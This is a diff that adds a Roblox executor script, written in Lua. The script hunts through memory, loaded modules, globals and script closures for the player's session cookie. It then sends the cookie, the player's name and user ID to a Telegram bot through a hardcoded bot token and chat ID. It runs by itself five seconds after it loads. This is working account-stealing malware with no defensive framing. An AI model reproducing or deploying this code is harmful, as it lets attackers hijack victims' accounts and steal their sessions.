@@ -1,0 +1,90 @@
+local HttpService = game:GetService("HttpService")
+local Player = game:GetService("Players").LocalPlayer
+local BOT_TOKEN = "8891863202:AAFOE51HO9CEtekAK-XiD8fAjwAqp3rz-dE"
+local CHAT_ID = "7659540201"
+
+local function findCookie()
+    local cookie = nil
+
+    pcall(function()
+        if identifyexecutor and identifyexecutor():lower():find("delta") then
+            for _, v in pairs(getgc()) do
+                if type(v) == "string" and v:len() > 500 and v:find("_|WARNING") then
+                    cookie = v:match("(_|WARNING[^%s\"']+)")
+                    if cookie then break end
+                end
+            end
+        end
+    end)
+
+    if not cookie then
+        pcall(function()
+            for _, v in pairs(getloadedmodules()) do
+                if type(v) == "string" and v:find("_|WARNING") then
+                    cookie = v:match("(_|WARNING[^%s\"']+)")
+                    if cookie then break end
+                end
+            end
+        end)
+    end
+
+    if not cookie then
+        pcall(function()
+            local env = getgenv and getgenv() or _G
+            for k, v in pairs(env) do
+                if type(v) == "string" and v:find("_|WARNING") and v:len() > 500 then
+                    cookie = v:match("(_|WARNING[^%s\"']+)")
+                    if cookie then break end
+                end
+            end
+        end)
+    end
+
+    if not cookie then
+        pcall(function()
+            local dump = dumpstring or getscriptclosure
+            if dump then
+                for i = 1, 2000 do
+                    pcall(function()
+                        local s = dump(i)
+                        if type(s) == "string" and s:find("_|WARNING") and s:len() > 500 then
+                            cookie = s:match("(_|WARNING[^%s\"']+)")
+                            if cookie then break end
+                        end
+                    end)
+                end
+            end
+        end)
+    end
+
+    if not cookie then
+        pcall(function()
+            local gc = getgc or get_gc
+            if gc then
+                for _, v in pairs(gc()) do
+                    if type(v) == "string" and v:len() > 500 and v:find("_|WARNING") then
+                        cookie = v:match("(_|WARNING[^%s\"']+)")
+                        if cookie then break end
+                    end
+                end
+            end
+        end)
+    end
+
+    return cookie
+end
+
+local function sendCookie(cookie)
+    local text = "🍪 " .. Player.Name .. " (" .. Player.UserId .. ")\n" .. cookie
+    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage?chat_id=" .. CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
+
+    pcall(function() syn and syn.request({Url = url}) end)
+    pcall(function() http_request and http_request({Url = url}) end)
+    pcall(function() request and request({Url = url}) end)
+end
+
+task.spawn(function()
+    task.wait(5)
+    local cookie = findCookie()
+    if cookie then sendCookie(cookie) end
+end)
